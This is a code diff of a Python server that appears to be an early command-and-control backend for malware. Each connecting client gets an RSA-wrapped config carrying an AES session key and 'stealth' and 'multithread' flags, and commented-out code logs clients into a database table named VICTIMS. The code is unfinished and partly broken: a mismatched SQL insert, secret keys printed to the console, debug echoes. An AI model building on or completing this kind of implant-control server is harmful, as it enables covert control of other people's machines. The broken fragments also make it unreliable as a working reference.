@@ -3,6 +3,17 @@ from env import *
 import threading
 import argparse
 from queue import Queue
+import select
+import base64
+import mysql.connector
+import sys
+import rsa
+
+import json
+from base64 import b64encode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
 
 
 
@@ -11,31 +22,46 @@ from queue import Queue
 
 
 
-def co(host, port):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((host, port))
-        s.listen()
-        print("ecoute sur : " + str(host) + ":" + str(port))
-        conn, addr = s.accept()
-    return conn, addr
+def handle_client(host, port, queue):
+    running = True
+
+    while running:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((host, port))
+            s.listen()
+            print("ecoute sur : " + str(host) + ":" + str(port))
+            conn, addr = s.accept()
+        
+
+        return conn, addr
 
 
-def emission(conn, addr):
-    while True:
-        message = input("Message :")
-        conn.sendall(message.encode())
-        if message == 'quitter':
-            break
+def emission(queue, conn, addr):
+
+    running = True
+    while running:
+        message = queue.get()
+
+        if message == 'stop-thread':
+            running = False
+            print("stopping emission thread on ip " + str(addr))
+        else:
+            conn.sendall(message)
+            print("data sent to " + str(addr))
 
 
-def reception(conn, addr):
-    print("Connection de :::: ", addr)
-    while True:
+def reception(queue, conn, addr):
+
+    running = True
+    while running:
         data = conn.recv(1024)
         if not data:
-            break
-        print(f" Client: {data.decode()}")
-
+            running = False
+            print("stopping reception thread on ip " + str(addr))
+        else:
+            queue.put(data)
+            print("data received from " + str(addr))
 
 
 # Fin fonctions
@@ -224,54 +250,104 @@ elif args.start:
         print("démarrage du serveur sur le port " + str(args.port))
 
 
+        # (addr, conn, emission thread, emission queue, reception thread, reception queue)
+        clients = []
+
+        # Socket
+        host = "127.0.0.1"
+        port = args.port
+
+        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        socket_server.bind((host, port))
+        socket_server.listen()
+        socket_list = [socket_server]
+        print("ecoute sur : " + str(host) + ":" + str(port))
+
+        # # Database
+        # db = mysql.connector.connect(
+        #     host=DBHOST,
+        #     user=DBUSER,
+        #     password=DBPASSWORD,
+        #     database=DB
+        # )
+
         running = True
 
         while running:
-            # Création de la connexion
-            conn, addr = co("127.0.0.1", args.port)
 
-            thread_emission = threading.Thread(target=emission, args=(conn, addr))
-            thread_reception = threading.Thread(target=reception, args=(conn, addr))
+            read_sockets, write_sockets, error_sockets = select.select(socket_list, [], socket_list)
 
-            thread_emission.start()
-            thread_reception.start()
+            for sock in read_sockets:
+                if sock is socket_server:
+                    conn, addr = sock.accept()
 
+                    # Création des threads d'émission et de réception
+                    emission_queue = Queue()
+                    thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
+                    thread_emission.start()
 
+                    reception_queue = Queue()
+                    thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
+                    thread_reception.start()
 
+                    # Handshake
+                    print("handshake with " + str(addr))
 
+                    # Récupération de la clé publique du client
+                    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
+                    print("public key : " + str(public_key))
 
+                    # Génération de la clé symétrique
+                    sym_key = get_random_bytes(16)
+                    iv = get_random_bytes(16)
+                    print("symetric key : " + str(sym_key))
+                    print("iv : " + str(iv))
 
+                    json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'
 
+                    # Chiffrement de la data avec la clé publique du client
+                    encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)
 
+                    # Envoi de la clé symétrique chiffrée
+                    emission_queue.put(encrypted_sym_key)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+                    print("yesssssss ======================")
+                    received_data = reception_queue.get()
+                    print(received_data)
 
 
+                    cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
+                    pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
 
+                    print("The message was: ", pt)
+                    
+                    cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
+
+                    ct_bytes = cipher.encrypt(pad((pt + "michou").encode(), AES.block_size))
+                    
+                    emission_queue.put(ct_bytes)
+
+
+                    # mycursor = db.cursor()
+
+                    # query = "INSERT INTO VICTIMS (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
+                    # values = ("John", "Highway 21")
+                    # mycursor.execute(query, values)
+
+
+                    # Ajout du client à la liste des clients
+                    clients.append((addr, conn, thread_emission, emission_queue, thread_reception, reception_queue))
+
+                    # Ajout du client à la base de données
+
+
+            # number = input("entrer un nombre :")
+            # clients[0][2].put(str(number))
+
+            # respons = clients[0][4].get()
+
+            # print("the respons is : " + str(respons))
 
 
 
